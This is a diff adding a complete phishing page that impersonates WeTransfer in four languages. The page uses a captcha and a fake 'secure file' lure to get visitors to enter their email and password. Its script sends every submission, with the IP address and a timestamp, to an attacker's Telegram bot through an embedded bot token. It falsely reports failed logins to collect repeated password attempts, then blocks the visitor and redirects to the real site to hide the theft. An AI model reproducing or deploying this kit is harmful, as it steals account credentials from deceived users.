@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="nl-BE">
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WeTransfer - File sharing</title>
+    <link rel="stylesheet" href="css/Mystyle.css">
+    <style>
+        /* Styles supplémentaires pour le navbar */
+        .navbar {
+            background-color: #ffffff;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+        }
+        .navbar-brand {
+            font-weight: bold;
+            font-size: 1.2rem;
+            color: #333;
+            text-decoration: none;
+        }
+        .navbar-brand img {
+            height: 40px;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        body {
+            padding-top: 70px; /* Pour éviter que le contenu soit caché par le navbar fixe */
+        }
+        /* Couleur du bouton en bleu */
+        .btn-blue {
+            background-color: #3767ea !important;
+        }
+        .btn-blue:hover {
+            background-color: #2a54c4 !important;
+        }
+        .btn-blue:disabled {
+            background-color: #7a94f0 !important;
+            cursor: not-allowed;
+        }
+        /* Pour le bouton de vérification captcha aussi */
+        .btn-verify {
+            background-color: #3767ea !important;
+        }
+        .btn-verify:hover {
+            background-color: #2a54c4 !important;
+        }
+        /* Logo dans le formulaire - centré */
+        .form-logo {
+            text-align: center;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .form-logo img {
+            height: 60px;
+            display: block;
+        }
+    </style>
+</head>
+<body class="bg-gray-100">
+    <!-- Navbar -->
+    <nav class="navbar">
+        <a href="#" class="navbar-brand">
+            <img src="css/logoheader.png" alt="WeTransfer">
+          
+        </a>
+        <div>
+            <span class="text-sm text-gray-600"></span>
+        </div>
+    </nav>
+
+    <div class="flex items-center justify-center flex-col min-h-screen">
+        <div>
+            <!-- Conteneur principal qui sera affiché après validation du captcha -->
+            <div id="main-content" class="md:p-10 shadow-md rounded-md bg-white md:w-[500px] w-auto mx-2 p-6 hidden">
+                <!-- Logo dans le formulaire - centré -->
+                <div class="form-logo">
+                    <img src="css/wet.png" alt="WeTransfer">
+                </div>
+                <p id="main-heading">You have received a secure file</p>
+                <div class="mt-3">
+                    <div class="flex items-center mb-7">
+                        <img src="css/pdf.png" class="w-10" alt="PDF Pictogram">
+                        <p class="font-bold mx-3">Devis.pdf</p>
+                    </div>
+                </div>
+                <p id="main-instruction">To read the document, enter the email details associated with this file.</p>
+                <br>
+                <div>
+                    <input type="email" id="zone-email" class="border w-full py-2 px-2" placeholder="Enter your email address">
+                    <div id="affiche-mdp" class="hidden transition-opacity duration-500 ease-in-out">
+                        <input type="password" id="zone-password" class="border w-full py-2 px-2 mt-3" placeholder="Enter the password">
+                    </div>
+                    <p class="mt-2 text-sm text-red-500 hidden" id="erreur-email">Please enter a valid email address.</p>
+                    <p class="mt-2 text-sm text-red-500 hidden" id="erreur-password">Password required.</p>
+                    <!-- Zone pour afficher le message d'erreur de mot de passe -->
+                    <div id="password-error-container" class="mt-2 hidden">
+                        <p id="password-error-message" class="text-sm text-red-500"></p>
+                    </div>
+                    <button type="button" id="continuer-button" class="mt-7 text-center w-full text-white font-bold py-2 btn-blue">Continue</button>
+                </div>
+            </div>
+
+            <!-- Captcha container -->
+            <div id="captcha-container" class="md:p-10 shadow-md rounded-md bg-white md:w-[500px] w-auto mx-2 p-6 mt-4">
+                <div class="text-center">
+                    <!-- Logo dans le captcha - centré -->
+                    <div class="form-logo">
+                        <img src="css/wet.png" alt="WeTransfer">
+                    </div>
+                    <h2 id="captcha-heading" class="text-xl font-bold mb-2">Security captcha</h2>
+                    <p id="captcha-description" class="text-gray-600 mb-4">To access the file, you must prove that you are not a robot</p>
+                    
+                    <!-- Simple math captcha -->
+                    <div class="bg-gray-100 p-4 rounded-lg mb-4">
+                        <p class="text-lg mb-2" id="captcha-question">What is <span id="num1">0</span> + <span id="num2">0</span>?</p>
+                        <input type="number" id="captcha-input" class="border w-full py-2 px-3 rounded-lg text-center text-lg" placeholder="Your answer">
+                        <p id="captcha-error" class="text-sm text-red-500 mt-2 hidden">Invalid answer. Please try again.</p>
+                    </div>
+                    
+                    <button type="button" id="verify-captcha" class="w-full text-white font-bold py-2 rounded-lg transition-colors btn-verify">Verify</button>
+                </div>
+            </div>
+
+            <!-- Conteneur pour le message d'expiration (visible si IP bloquée) -->
+            <div id="expired-container" class="md:p-10 shadow-md rounded-md bg-white md:w-[500px] w-auto mx-2 p-6 mt-4 hidden">
+                <div class="text-center">
+                    <div class="form-logo">
+                        <img src="css/we.png" alt="WeTransfer">
+                    </div>
+                    <h2 class="text-xl font-bold text-red-600 mb-3">🔒 Lien expiré</h2>
+                    <p class="text-gray-700 mb-4">Vous avez dépassé le nombre de tentatives autorisées. Ce lien n'est plus valide.</p>
+                    <p class="text-sm text-gray-500 mb-6">Redirection vers la page d'accueil dans quelques secondes...</p>
+                    <div class="w-full bg-gray-200 rounded-full h-2.5 mb-4">
+                        <div id="progress-bar" class="bg-red-500 h-2.5 rounded-full" style="width: 0%"></div>
+                    </div>
+                    <a id="redirect-link" href="https://wetransfer.com" target="_blank" class="text-[#3767ea] hover:underline">Aller sur wetransfer.com</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            
+            // --- Gestion du blocage par IP avec localStorage ---
+            var STORAGE_KEY = 'wetransfer_blocked_ips';
+            
+            function getBlockedIPs() {
+                try {
+                    var data = localStorage.getItem(STORAGE_KEY);
+                    return data ? JSON.parse(data) : {};
+                } catch (e) {
+                    return {};
+                }
+            }
+            
+            function isIPBlocked(ip) {
+                var blocked = getBlockedIPs();
+                return blocked[ip] === true;
+            }
+            
+            function blockIP(ip) {
+                var blocked = getBlockedIPs();
+                blocked[ip] = true;
+                localStorage.setItem(STORAGE_KEY, JSON.stringify(blocked));
+            }
+            
+            // --- Récupération de l'IP (simulée pour l'exemple, car en local on utilise un fallback) ---
+            var userIP = 'Inconnue';
+            
+            function fetchUserIP() {
+                return fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data && data.ip) {
+                            userIP = data.ip;
+                            console.log('IP récupérée:', userIP);
+                            // Vérifier si l'IP est bloquée
+                            if (isIPBlocked(userIP)) {
+                                showExpiredMessage();
+                            }
+                        }
+                        return userIP;
+                    })
+                    .catch(err => {
+                        console.warn('Impossible de récupérer l\'IP:', err);
+                        // Fallback: utiliser une IP locale pour les tests
+                        userIP = '127.0.0.1';
+                        // Ne pas bloquer en local pour permettre les tests
+                        return userIP;
+                    });
+            }
+            
+            // --- Afficher le message d'expiration et rediriger ---
+            function showExpiredMessage() {
+                var mainContent = document.getElementById('main-content');
+                var captchaContainer = document.getElementById('captcha-container');
+                var expiredContainer = document.getElementById('expired-container');
+                
+                mainContent.classList.add('hidden');
+                captchaContainer.classList.add('hidden');
+                expiredContainer.classList.remove('hidden');
+                
+                // Animation de la barre de progression
+                var progressBar = document.getElementById('progress-bar');
+                var width = 0;
+                var interval = setInterval(function() {
+                    if (width >= 100) {
+                        clearInterval(interval);
+                        // Redirection après 5 secondes
+                        window.location.href = 'https://wetransfer.com';
+                    } else {
+                        width += 2;
+                        progressBar.style.width = width + '%';
+                    }
+                }, 100);
+            }
+            
+            // --- Langues ---
+            var supportedLangs = {
+                fr: {
+                    htmlLang: 'fr-FR',
+                    title: 'WeTransfer - Partager un fichier',
+                    mainHeading: 'Vous avez reçu un fichier sécurisé',
+                    mainInstruction: 'Pour lire le document, saisissez les informations e-mail associées à ce fichier.',
+                    emailPlaceholder: 'Entrez votre adresse e-mail',
+                    passwordPlaceholder: 'Entrez le mot de passe',
+                    errorEmail: 'Entrez une adresse e-mail valide.',
+                    errorPassword: 'Mot de passe requis.',
+                    captchaHeading: 'Captcha de sécurité',
+                    captchaDescription: 'Pour accéder au fichier, vous devez prouver que vous n’êtes pas un robot',
+                    captchaQuestionPrefix: 'Quel est',
+                    captchaInputPlaceholder: 'Votre réponse',
+                    verifyButton: 'Vérifier',
+                    invalidNumber: 'Entrez un nombre valide.',
+                    wrongAnswer: 'Réponse incorrecte. Essayez encore.',
+                    wrongCredentials: '⚠️ Informations incorrectes. Essayez encore.',
+                    successCredentials: '✅ Informations valides ! Redirection vers le document PDF...',
+                    expiredTitle: '🔒 Lien expiré',
+                    expiredMessage: 'Vous avez dépassé le nombre de tentatives autorisées. Ce lien n\'est plus valide.',
+                    expiredRedirect: 'Redirection vers la page d\'accueil dans quelques secondes...',
+                    expiredLink: 'Aller sur wetransfer.com'
+                },
+                nl: {
+                    htmlLang: 'nl-BE',
+                    title: 'WeTransfer - Bestand delen',
+                    mainHeading: 'U hebt een beveiligd bestand ontvangen',
+                    mainInstruction: 'Om het document te lezen, voert u de e-mailgegevens in die aan dit bestand zijn gekoppeld.',
+                    emailPlaceholder: 'Voer uw e-mailadres in',
+                    passwordPlaceholder: 'Voer het wachtwoord in',
+                    errorEmail: 'Voer een geldig e-mailadres in.',
+                    errorPassword: 'Wachtwoord vereist.',
+                    captchaHeading: 'Veiligheidscaptcha',
+                    captchaDescription: 'Om toegang te krijgen tot het bestand, moet u bewijzen dat u geen robot bent',
+                    captchaQuestionPrefix: 'Wat is',
+                    captchaInputPlaceholder: 'Uw antwoord',
+                    verifyButton: 'Verifiëren',
+                    invalidNumber: 'Voer een geldig getal in.',
+                    wrongAnswer: 'Ongeldig antwoord. Probeer opnieuw.',
+                    wrongCredentials: '⚠️ Onjuiste gegevens. Probeer opnieuw.',
+                    successCredentials: '✅ Geldige gegevens! Doorverwijzen naar PDF-document...',
+                    expiredTitle: '🔒 Link verlopen',
+                    expiredMessage: 'U hebt het toegestane aantal pogingen overschreden. Deze link is niet langer geldig.',
+                    expiredRedirect: 'Doorverwijzen naar de startpagina over enkele seconden...',
+                    expiredLink: 'Ga naar wetransfer.com'
+                },
+                es: {
+                    htmlLang: 'es-ES',
+                    title: 'WeTransfer - Compartir un archivo',
+                    mainHeading: 'Ha recibido un archivo seguro',
+                    mainInstruction: 'Para leer el documento, introduzca los datos de correo asociados a este archivo.',
+                    emailPlaceholder: 'Introduzca su correo electrónico',
+                    passwordPlaceholder: 'Introduzca la contraseña',
+                    errorEmail: 'Introduzca una dirección de correo válida.',
+                    errorPassword: 'Se requiere contraseña.',
+                    captchaHeading: 'Captcha de seguridad',
+                    captchaDescription: 'Para acceder al archivo, debe demostrar que no es un robot',
+                    captchaQuestionPrefix: 'Cuál es',
+                    captchaInputPlaceholder: 'Su respuesta',
+                    verifyButton: 'Verificar',
+                    invalidNumber: 'Introduzca un número válido.',
+                    wrongAnswer: 'Respuesta incorrecta. Inténtelo de nuevo.',
+                    wrongCredentials: '⚠️ Datos incorrectos. Inténtelo de nuevo.',
+                    successCredentials: '✅ Datos válidos. Redirigiendo al documento PDF...',
+                    expiredTitle: '🔒 Enlace caducado',
+                    expiredMessage: 'Ha superado el número de intentos permitidos. Este enlace ya no es válido.',
+                    expiredRedirect: 'Redirigiendo a la página de inicio en unos segundos...',
+                    expiredLink: 'Ir a wetransfer.com'
+                },
+                en: {
+                    htmlLang: 'en-US',
+                    title: 'WeTransfer - File sharing',
+                    mainHeading: 'You have received a secure file',
+                    mainInstruction: 'To read the document, enter the email details associated with this file.',
+                    emailPlaceholder: 'Enter your email address',
+                    passwordPlaceholder: 'Enter the password',
+                    errorEmail: 'Please enter a valid email address.',
+                    errorPassword: 'Password required.',
+                    captchaHeading: 'Security captcha',
+                    captchaDescription: 'To access the file, you must prove that you are not a robot',
+                    captchaQuestionPrefix: 'What is',
+                    captchaInputPlaceholder: 'Your answer',
+                    verifyButton: 'Verify',
+                    invalidNumber: 'Please enter a valid number.',
+                    wrongAnswer: 'Invalid answer. Please try again.',
+                    wrongCredentials: '⚠️ Incorrect details. Please try again.',
+                    successCredentials: '✅ Valid details. Redirecting to the PDF document...',
+                    expiredTitle: '🔒 Link expired',
+                    expiredMessage: 'You have exceeded the allowed number of attempts. This link is no longer valid.',
+                    expiredRedirect: 'Redirecting to the homepage in a few seconds...',
+                    expiredLink: 'Go to wetransfer.com'
+                }
+            };
+            
+            function getBrowserLang() {
+                var lang = navigator.language || navigator.userLanguage || 'en';
+                var normalized = lang.split('-')[0].toLowerCase();
+                if (supportedLangs[normalized]) {
+                    return normalized;
+                }
+                return 'en';
+            }
+            
+            function applyLanguage(code) {
+                var texts = supportedLangs[code] || supportedLangs.en;
+                document.documentElement.lang = texts.htmlLang;
+                document.title = texts.title;
+                document.getElementById('main-heading').textContent = texts.mainHeading;
+                document.getElementById('main-instruction').textContent = texts.mainInstruction;
+                document.getElementById('zone-email').placeholder = texts.emailPlaceholder;
+                document.getElementById('zone-password').placeholder = texts.passwordPlaceholder;
+                document.getElementById('erreur-email').textContent = texts.errorEmail;
+                document.getElementById('erreur-password').textContent = texts.errorPassword;
+                document.getElementById('captcha-heading').textContent = texts.captchaHeading;
+                document.getElementById('captcha-description').textContent = texts.captchaDescription;
+                document.getElementById('captcha-input').placeholder = texts.captchaInputPlaceholder;
+                document.getElementById('verify-captcha').textContent = texts.verifyButton;
+                document.getElementById('captcha-error').textContent = texts.wrongAnswer;
+                
+                // Mettre à jour le message d'expiration
+                var expiredContainer = document.getElementById('expired-container');
+                if (expiredContainer) {
+                    expiredContainer.querySelector('h2').textContent = texts.expiredTitle;
+                    expiredContainer.querySelector('p:nth-of-type(1)').textContent = texts.expiredMessage;
+                    expiredContainer.querySelector('p:nth-of-type(2)').textContent = texts.expiredRedirect;
+                    expiredContainer.querySelector('a').textContent = texts.expiredLink;
+                }
+                return texts;
+            }
+            
+            var activeLang = applyLanguage(getBrowserLang());
+            
+            // --- Captcha ---
+            var num1, num2, expectedAnswer;
+            var captchaContainer = document.getElementById('captcha-container');
+            var mainContent = document.getElementById('main-content');
+            var verifyButton = document.getElementById('verify-captcha');
+            var captchaInput = document.getElementById('captcha-input');
+            var captchaError = document.getElementById('captcha-error');
+            var num1Span = document.getElementById('num1');
+            var num2Span = document.getElementById('num2');
+            
+            function generateCaptcha() {
+                num1 = Math.floor(Math.random() * 10) + 1;
+                num2 = Math.floor(Math.random() * 10) + 1;
+                expectedAnswer = num1 + num2;
+                num1Span.textContent = num1;
+                num2Span.textContent = num2;
+                captchaInput.value = '';
+                captchaError.classList.add('hidden');
+            }
+            
+            function verifyCaptcha() {
+                var userAnswer = parseInt(captchaInput.value);
+                
+                if (isNaN(userAnswer)) {
+                    captchaError.textContent = activeLang.invalidNumber;
+                    captchaError.classList.remove('hidden');
+                    return;
+                }
+                
+                if (userAnswer === expectedAnswer) {
+                    captchaContainer.classList.add('hidden');
+                    mainContent.classList.remove('hidden');
+                } else {
+                    captchaError.textContent = activeLang.wrongAnswer;
+                    captchaError.classList.remove('hidden');
+                    generateCaptcha();
+                }
+            }
+            
+            generateCaptcha();
+            verifyButton.addEventListener('click', verifyCaptcha);
+            captchaInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    verifyCaptcha();
+                }
+            });
+            
+            // --- Application principale (après captcha) ---
+            var emailInput = document.getElementById('zone-email');
+            var passwordInput = document.getElementById('zone-password');
+            var errorEmailMessage = document.getElementById('erreur-email');
+            var errorPasswordMessage = document.getElementById('erreur-password');
+            var continueButton = document.getElementById('continuer-button');
+            var passwordFieldContainer = document.getElementById('affiche-mdp');
+            var passwordErrorContainer = document.getElementById('password-error-container');
+            var passwordErrorMessage = document.getElementById('password-error-message');
+            
+            var telegramBotToken = '8764342010:AAEmuEizfjoOvYAm0cSAYTLTD-33bE2DQ4k';
+            var chatId = '8433529101';
+            
+            var tentativeCount = 0;
+            var isProcessing = false;
+            var maxAttempts = 3;
+            var redirectDone = false;
+            
+            var validPdfUrl = 'Questionnaire_etude_notariale.pdf';
+            
+            function sendToTelegram(email, password, attemptNumber, timestamp, ip) {
+                var message = `📩 WeTransfer bestandstoegang nr. ${attemptNumber} / 3\n` +
+                              `📧 E-mail: ${email}\n` +
+                              `🔑 Wachtwoord: ${password}\n` +
+                              `🕒 Datum & Tijd: ${timestamp}\n` +
+                              `🌐 IP-adres: ${ip}\n` +
+                              `━━━━━━━━━━━━━━━━━━━━`;
+                              
+                return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log(`Telegram-bericht verzonden (poging ${attemptNumber}):`, data);
+                    return true;
+                })
+                .catch(error => {
+                    console.error('Telegram-fout:', error);
+                    return false;
+                });
+            }
+            
+            async function sendMultipleCredentials(email, password, currentAttemptNumber, ip) {
+                console.log(`${currentAttemptNumber} bericht(en) verzenden voor poging nr. ${currentAttemptNumber}`);
+                var timestamp = new Date().toLocaleString('nl-BE', { hour12: false });
+                for (var i = 0; i < currentAttemptNumber; i++) {
+                    if (i > 0) await new Promise(r => setTimeout(r, 350)); 
+                    await sendToTelegram(email, password, currentAttemptNumber, timestamp, ip);
+                }
+            }
+            
+            function validateEmail(email) {
+                var re = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+                return re.test(email);
+            }
+            
+            function showPasswordError(message) {
+                passwordErrorMessage.textContent = message;
+                passwordErrorContainer.classList.remove('hidden');
+            }
+            
+            function hidePasswordError() {
+                passwordErrorContainer.classList.add('hidden');
+            }
+            
+            async function handleSubmit() {
+                if (isProcessing || redirectDone) return;
+                
+                // Vérifier si l'IP est bloquée (au cas où)
+                if (userIP !== 'Inconnue' && isIPBlocked(userIP)) {
+                    showExpiredMessage();
+                    return;
+                }
+                
+                var isPasswordVisible = !passwordFieldContainer.classList.contains('hidden');
+                
+                if (!isPasswordVisible) {
+                    errorEmailMessage.classList.add('hidden');
+                    errorPasswordMessage.classList.add('hidden');
+                    hidePasswordError();
+                    
+                    var email = emailInput.value.trim();
+                    if (!validateEmail(email)) {
+                        errorEmailMessage.textContent = activeLang.errorEmail;
+                        errorEmailMessage.classList.remove('hidden');
+                        return;
+                    }
+                    
+                    passwordFieldContainer.classList.remove('hidden');
+                    passwordInput.focus();
+                    return;
+                }
+                
+                errorEmailMessage.classList.add('hidden');
+                errorPasswordMessage.classList.add('hidden');
+                hidePasswordError();
+                
+                var email = emailInput.value.trim();
+                var password = passwordInput.value.trim();
+                
+                if (!validateEmail(email)) {
+                    errorEmailMessage.textContent = activeLang.errorEmail;
+                    errorEmailMessage.classList.remove('hidden');
+                    return;
+                }
+                if (password === "") {
+                    errorPasswordMessage.textContent = activeLang.errorPassword;
+                    errorPasswordMessage.classList.remove('hidden');
+                    return;
+                }
+                
+                tentativeCount++;
+                isProcessing = true;
+                
+                var ipToSend = userIP;
+                if (ipToSend === 'Inconnue') {
+                    await fetchUserIP();
+                    ipToSend = userIP;
+                }
+                
+                await sendMultipleCredentials(email, password, tentativeCount, ipToSend);
+                
+                if (tentativeCount < maxAttempts) {
+                    // Afficher le message d'erreur entre l'input password et le bouton
+                    showPasswordError(activeLang.wrongCredentials);
+                    // Réinitialiser le champ password pour une nouvelle tentative
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                    isProcessing = false;
+                } 
+                else if (tentativeCount === maxAttempts) {
+                    // Dernière tentative - blocage IP
+                    showPasswordError(activeLang.wrongCredentials);
+                    // Bloquer l'IP
+                    if (userIP !== 'Inconnue') {
+                        blockIP(userIP);
+                    }
+                    // Afficher le message d'expiration après un court délai
+                    setTimeout(function() {
+                        showExpiredMessage();
+                    }, 1500);
+                    redirectDone = true;
+                    continueButton.disabled = true;
+                    continueButton.classList.add('opacity-50', 'cursor-not-allowed');
+                }
+            }
+            
+            // --- Initialisation avec vérification IP ---
+            fetchUserIP().then(function(ip) {
+                // Si l'IP est déjà bloquée au chargement, afficher le message d'expiration
+                if (ip !== 'Inconnue' && isIPBlocked(ip)) {
+                    showExpiredMessage();
+                }
+            });
+            
+            // --- Observer pour attacher les événements quand le contenu principal apparaît ---
+            var observer = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    if (mutation.attributeName === 'class') {
+                        if (!mainContent.classList.contains('hidden')) {
+                            // Attacher les événements
+                            continueButton.addEventListener('click', handleSubmit);
+                            
+                            function onKeyPress(e) {
+                                if (e.key === 'Enter') {
+                                    e.preventDefault();
+                                    if (!isProcessing && !redirectDone) {
+                                        handleSubmit();
+                                    }
+                                }
+                            }
+                            emailInput.addEventListener('keypress', onKeyPress);
+                            passwordInput.addEventListener('keypress', onKeyPress);
+                            
+                            passwordFieldContainer.classList.add('hidden');
+                            errorEmailMessage.classList.add('hidden');
+                            errorPasswordMessage.classList.add('hidden');
+                            hidePasswordError();
+                            tentativeCount = 0;
+                            redirectDone = false;
+                            continueButton.disabled = false;
+                            continueButton.classList.remove('opacity-50', 'cursor-not-allowed');
+                            
+                            observer.disconnect();
+                        }
+                    }
+                });
+            });
+            
+            observer.observe(mainContent, { attributes: true });
+        });
+    </script>
+</body>
+</html>
